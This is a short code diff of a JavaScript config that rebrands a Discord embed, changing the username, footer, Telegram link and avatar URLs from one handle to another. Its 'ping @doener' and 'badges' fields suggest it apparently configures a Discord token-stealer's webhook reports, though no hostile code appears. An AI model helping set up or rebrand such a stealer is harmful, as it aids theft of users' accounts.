@@ -23,13 +23,13 @@ var config = {
     ping: [true, "@doener"],
 
     embed: {
-        username: "Katliam",
+        username: "forcenxd",
         footer: {
-            text: `Katliam`,
-            icon_url: "https://cdn.discordapp.com/attachments/1053008770852200469/1119624745386770561/80440671-03B8-4D0B-AC3E-EAAC43F1E4BD.png",
+            text: `forcenxd`,
+            icon_url: "https://media.discordapp.net/attachments/1119661402366418967/1119803503402041435/bbs.png",
         },
-        href: "https://t.me/katliam19",
-        avatar_url: "https://cdn.discordapp.com/attachments/1053008770852200469/1119624745386770561/80440671-03B8-4D0B-AC3E-EAAC43F1E4BD.png"
+        href: "https://t.me/slenderpeg",
+        avatar_url: "https://media.discordapp.net/attachments/1119661402366418967/1119803503402041435/bbs.png"
     },
 
     badges: {
